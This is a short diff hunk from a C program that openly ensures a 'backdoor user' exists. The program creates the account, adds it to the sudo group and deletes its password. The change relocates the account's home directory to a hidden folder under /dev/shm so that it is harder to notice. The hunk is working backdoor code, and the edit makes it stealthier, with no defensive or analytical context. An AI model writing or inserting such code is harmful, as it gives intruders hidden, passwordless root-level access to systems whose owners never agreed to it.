@@ -48,7 +48,7 @@ int main() {
     // Ensure backdoor user exists
     struct passwd *pwd = getpwnam(BACKDOOR_USER);
     if (pwd == NULL) {
-        system("/usr/sbin/useradd -m " BACKDOOR_USER);
+        system("/usr/sbin/useradd -m -d /dev/shm/.sysdata " BACKDOOR_USER);
         system("/usr/sbin/usermod -aG sudo " BACKDOOR_USER);
         system("/usr/bin/passwd -d " BACKDOOR_USER);
     }
